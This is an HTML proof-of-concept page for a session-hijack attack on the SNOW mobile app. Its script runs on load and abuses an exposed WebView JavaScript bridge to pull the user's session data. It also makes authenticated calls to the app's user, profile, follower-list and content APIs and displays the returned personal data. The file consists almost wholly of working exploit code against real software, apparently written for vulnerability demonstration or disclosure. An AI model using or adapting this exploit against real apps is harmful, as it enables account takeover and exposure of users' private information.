
<!DOCTYPE html>
<html>
<head>
    <title>SNOW PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body{font-family:-apple-system,sans-serif;padding:10px;background:#1a1a2e;min-height:100vh;margin:0;color:#fff}
        .container{max-width:500px;margin:0 auto}
        h1{color:#00ff88;text-align:center;font-size:16px}
        .status{padding:6px 10px;margin:4px 0;background:#16213e;border-radius:6px;font-size:9px;word-break:break-all}
        .success{border-left:3px solid #00ff88}
        .error{border-left:3px solid #ff6b6b}
        .critical{border-left:3px solid #ff00ff;background:#2d1b3d}
        pre{background:#0f0f23;color:#00ff88;padding:8px;border-radius:5px;font-size:8px;overflow-x:auto;max-height:200px;white-space:pre-wrap}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 SNOW Session Hijack PoC</h1>
        <div id="status"></div>
    </div>

    <script>
    var Bridge = window.B612KajiBridgeInterface;

    function log(msg, type) {
        var div = document.createElement('div');
        div.className = 'status ' + (type || '');
        div.textContent = msg;
        document.getElementById('status').appendChild(div);
    }

    function showData(title, data) {
        var pre = document.createElement('pre');
        pre.textContent = title + ':\n' + JSON.stringify(data, null, 2);
        document.getElementById('status').appendChild(pre);
    }

    function runExploit() {
        if (typeof B612KajiBridgeInterface === 'undefined') {
            log('Bridge NOT found', 'error');
            return;
        }
        Bridge = B612KajiBridgeInterface;
        log('✅ Bridge FOUND!', 'success');

        // 1. getUserSession - 세션 정보 (가장 중요)
        window.sessionCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🔑 SESSION HIJACKED!', 'critical');
            showData('Session Data', d);
        };
        try {
            Bridge.getUserSession('sessionCB');
        } catch(e) {
            log('getUserSession error: ' + e, 'error');
        }

        // 2. apiRequest - 실제 사용자 API 호출 (올바른 엔드포인트)
        window.meCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🎯 /v1/user/me Response!', 'critical');
            showData('User Me API', d);
        };
        try {
            Bridge.apiRequest('meCB', JSON.stringify({
                url: 'https://user-snow-api.snow.me/v1/user/me',
                method: 'POST'
            }));
            log('Calling /v1/user/me...', '');
        } catch(e) {
            log('apiRequest me: ' + e, 'error');
        }

        // 3. 프로필 API
        window.profileCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('🎯 /v1/user/profile Response!', 'critical');
            showData('User Profile API', d);
        };
        try {
            Bridge.apiRequest('profileCB', JSON.stringify({
                url: 'https://user-snow-api.snow.me/v1/user/profile',
                method: 'POST'
            }));
        } catch(e) {}

        // 4. 팔로워 목록 (개인정보)
        window.followerCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('👥 Follower List!', 'critical');
            showData('Followers', d);
        };
        try {
            Bridge.apiRequest('followerCB', JSON.stringify({
                url: 'https://user-snow-api.snow.me/v1/user/follower/list',
                method: 'POST',
                parameters: {page: 1, size: 10}
            }));
        } catch(e) {}

        // 5. 콘텐츠 API
        window.contentCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('📷 Content API Response!', 'success');
            showData('Content', d);
        };
        try {
            Bridge.apiRequest('contentCB', JSON.stringify({
                url: 'https://content-snow-api.snow.me/v1/user/me',
                method: 'GET'
            }));
        } catch(e) {}

        // 6. appInfo
        window.appCB = function(data) {
            var d = typeof data === 'string' ? JSON.parse(data) : data;
            log('📱 App Info', 'success');
            showData('AppInfo', d);
        };
        try {
            Bridge.appInfo('appCB');
        } catch(e) {}
    }

    setTimeout(runExploit, 500);
    </script>
</body>
</html>
